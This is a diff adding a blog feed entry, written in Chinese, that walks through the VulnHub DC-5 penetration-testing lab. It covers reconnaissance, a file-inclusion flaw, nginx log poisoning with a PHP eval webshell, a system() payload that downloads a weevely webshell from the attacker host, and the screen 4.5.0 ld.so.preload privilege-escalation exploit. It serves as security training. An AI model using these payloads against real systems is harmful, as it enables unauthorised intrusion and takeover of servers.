@@ -4,6 +4,37 @@
   
     
     <entry>
+      <title>综合实战第二章-DC-5</title>
+      <link href="/2022/05/01/DC-5/"/>
+      <url>/2022/05/01/DC-5/</url>
+      
+        <content type="html"><![CDATA[<h1 id="综合实战第二章"><a href="#综合实战第二章" class="headerlink" title="综合实战第二章"></a>综合实战第二章</h1><h2 id="DC-5"><a href="#DC-5" class="headerlink" title="DC-5"></a>DC-5</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><blockquote><p>靶场下载：<a href="https://www.vulnhub.com/?page=2&amp;q=dc">https://www.vulnhub.com/?page=2&amp;q=dc</a></p><p>攻击机:</p><p>kali 192.168.3.134</p><p>win7 192.168.3.137</p><p>靶机:DC-5 192.168.3.166</p></blockquote><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>枯燥乏味的信息搜集</p><pre class=" language-Linux"><code class="language-Linux">nmap -p- -A 192.168.3.166</code></pre><p><img src="/2022/05/01/DC-5/image-20220501110232344.png" alt="image-20220501110232344"></p><p>访问80端口看看有什么有用的信息</p><p><img src="/2022/05/01/DC-5/image-20220501111034039.png" alt="image-20220501111034039"></p><p>在这里可以提交表单看一下</p><p><img src="/2022/05/01/DC-5/image-20220501111106416.png" alt="image-20220501111106416"></p><p>发现这玩意会随着刷新而变化</p><p><img src="/2022/05/01/DC-5/image-20220501111131243.png" alt="image-20220501111131243"></p><p>抓包看看</p><p><img src="/2022/05/01/DC-5/image-20220501150840499.png" alt="image-20220501150840499"></p><p>穷举一下看看有哪些文件名</p><p>把他扔到intrude里</p><p>payload选择filenames-short和filenames-long</p><p><img src="/2022/05/01/DC-5/image-20220502103240049.png" alt="image-20220502103240049"></p><p>开始穷举</p><p>扫到这些玩意</p><p><img src="/2022/05/01/DC-5/image-20220502103457179.png" alt="image-20220502103457179"></p><p>发现footer页面</p><p><img src="/2022/05/01/DC-5/image-20220502103641356.png" alt="image-20220502103641356"></p><p>每次刷新他都会变，说明之前的页面可能调用了footer</p><p>继续抓包，对参数进行穷举</p><p><img src="/2022/05/01/DC-5/image-20220502103937407.png" alt="image-20220502103937407"></p><p>设置两个参数</p><p><img src="/2022/05/01/DC-5/image-20220502104050301.png" alt="image-20220502104050301"></p><p>模式选择这个</p><p><img src="/2022/05/01/DC-5/image-20220502104125682.png" alt="image-20220502104125682"></p><p>第一个攻击载荷选择filename-short和filename-long</p><p><img src="/2022/05/01/DC-5/image-20220502104307938.png" alt="image-20220502104307938"></p><p>第二个攻击载荷选择fuzzing-full</p><p><img src="/2022/05/01/DC-5/image-20220502104351774.png" alt="image-20220502104351774"></p><p>穷举出来前面的名字是<code>file</code></p><p><img src="/2022/05/01/DC-5/image-20220502104435202.png" alt="image-20220502104435202"></p><p>再次进行抓包，这次对file后面的信息进行破解</p><p><img src="/2022/05/01/DC-5/image-20220502104604033.png" alt="image-20220502104604033"></p><p>payload选择fuzzing-full</p><p><img src="/2022/05/01/DC-5/image-20220502104633865.png" alt="image-20220502104633865"></p><p>与众不同的东西就出来了，访问看一下</p><p><img src="/2022/05/01/DC-5/image-20220502104658010.png" alt="image-20220502104658010"></p><p><img src="/2022/05/01/DC-5/image-20220502104751528.png" alt="image-20220502104751528"></p><p>出现漏洞</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>进入kali，在kali中打开burpsuite</p><p>访问日志文件</p><pre class=" language-Linux"><code class="language-Linux">http://192.168.3.166/thankyou.php?file=/var/log/nginx/access.log</code></pre><p><img src="/2022/05/01/DC-5/image-20220502105408133.png" alt="image-20220502105408133"></p><p>此时我们随便构造一个链接</p><pre class=" language-Linux"><code class="language-Linux">192.168.3.166/test1</code></pre><p><img src="/2022/05/01/DC-5/image-20220502105507490.png" alt="image-20220502105507490"></p><p>访问，然后在日志里搜索</p><p><img src="/2022/05/01/DC-5/image-20220502105544758.png" alt="image-20220502105544758"></p><p>也就是说，我们可以构造一句话木马</p><p>抓包</p><p>构造一句话木马</p><pre class=" language-Linux"><code class="language-Linux">GET /test1! <?php @eval($_GET['a']);?>  HTTP/1.1</code></pre><p><img src="/2022/05/01/DC-5/image-20220502110046714.png" alt="image-20220502110046714"></p><p>回到日志里查看一下</p><p><img src="/2022/05/01/DC-5/image-20220502110204526.png" alt="image-20220502110204526"></p><p>后面没跟东西，此时我们做一下测试</p><pre class=" language-Linux"><code class="language-Linux">http://192.168.3.166/thankyou.php?file=/var/log/nginx/access.log&a=phpinfo();</code></pre><p><img src="/2022/05/01/DC-5/image-20220502110328002.png" alt="image-20220502110328002"></p><p>成功打开phpinfo</p><p>把这个包抓到burpsuite里，扔到repeater里备用</p><h3 id="上传木马"><a href="#上传木马" class="headerlink" title="上传木马"></a>上传木马</h3><p>准备构造木马</p><pre class=" language-Linux"><code class="language-Linux">weevely generate 123456 dcmuma.php</code></pre><p>然后打开httpserver</p><pre class=" language-Linux"><code class="language-Linux">python -m SimpleHTTPServer</code></pre><p>做完这些后，打开burpsuite，拿出我们之前抓到的包</p><p>构造参数</p><pre class=" language-Linux"><code class="language-Linux">GET /thankyou.php?file=/var/log/nginx/access.log&a=system('cd /tmp;wget http://192.168.3.134/dcmuma.php;chmod +x dcmuma.php'); HTTP/1.1</code></pre><p><img src="/2022/05/01/DC-5/image-20220502112130409.png" alt="image-20220502112130409"></p><p>可以看到上传成功</p><p><img src="/2022/05/01/DC-5/image-20220502112201319.png" alt="image-20220502112201319"></p><p>进行测试</p><pre class=" language-Linux"><code class="language-Linux">weevely http://192.168.3.166/thankyou.php?file=/tmp/dcmuma.php 123456</code></pre><p><img src="/2022/05/01/DC-5/image-20220502112343036.png" alt="image-20220502112343036"></p><p>成功连接</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>查找有啥玩意能够进行提权</p><pre class=" language-Linux"><code class="language-Linux">find / -perm -4000 2>/dev/null</code></pre><p><img src="/2022/05/01/DC-5/image-20220502112903058.png" alt="image-20220502112903058"></p><p>找到一个这玩意，可以看看有没有什么漏洞可以利用</p><pre class=" language-Linux"><code class="language-Linux">searchsploit screen 4.5.0 </code></pre><p><img src="/2022/05/01/DC-5/image-20220502113019380.png" alt="image-20220502113019380"></p><p>先拷贝一下</p><pre class=" language-Linux"><code class="language-Linux">cp /usr/share/exploitdb/exploits/linux/local/41154.sh 41154.sh cp /usr/share/exploitdb/exploits/linux/local/41152.txt 41152.txt</code></pre><p>先看一下这俩玩意里面有啥</p><p>就以41154.sh来看，按照里面的步骤做就好</p><p>新建一个<code>libhax.c</code></p><p>把第一段复制过去</p><p>然后按照里面的命令执行就好</p><pre class=" language-Linux"><code class="language-Linux">gcc -fPIC -shared -ldl -o ./libhax.so ./libhax.c</code></pre><p>剩下都按照步骤做完就好</p><p>最后新建一个runme.sh</p><p>然后把最后一段复制进去</p><pre class=" language-Linux"><code class="language-Linux">echo "[+] Now we create our /etc/ld.so.preload file..."cd /etcumask 000 # becausescreen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline neededecho "[+] Triggering..."screen -ls # screen itself is setuid, so.../tmp/rootshell</code></pre><p>然后把这些玩意都传上去</p><pre class=" language-Linux"><code class="language-Linux">wget http://192.168.3.134:8000/libhax.sowget http://192.168.3.134:8000/rootshellwget http://192.168.3.134:8000/runme.sh</code></pre><p>然后运行</p><pre class=" language-Linux"><code class="language-Linux">./runme.sh</code></pre><p>提权失败，白瞎拉到</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 靶场练习 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 网络安全 </tag>
+            
+            <tag> 综合实战 </tag>
+            
+            <tag> 渗透测试 </tag>
+            
+            <tag> 靶场练习 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>综合实战第二章-DC-4</title>
       <link href="/2022/04/30/DC-4/"/>
       <url>/2022/04/30/DC-4/</url>
